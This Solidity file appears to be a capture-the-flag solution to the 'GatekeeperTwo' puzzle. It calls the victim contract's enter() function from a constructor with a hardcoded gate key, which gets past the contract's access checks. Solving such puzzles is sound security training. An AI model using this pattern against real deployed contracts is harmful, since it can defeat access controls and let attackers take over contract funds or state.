// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.0;

import "./vict.sol";

contract Testing {
    GatekeeperTwo public victimContract;

    // bytes8 public payload_bytes = 0xA6CE4B12A9531B3B;
    // uint64 public payload_int = uint64(payload_bytes);
    // uint64 public required = 12019626999020723003;

    constructor(address _addr) {
        victimContract = GatekeeperTwo(_addr);
        bytes8 payload_bytes = 0xA6CE4B12A9531B3B;
        bool result;
        result = victimContract.enter(payload_bytes);
    }

    // function test(bytes8 data) public view returns (uint64) {
    //     return uint(data);
    // }

    // function attack() public {

    //     victimContract.enter(payload_bytes);
    // }
}
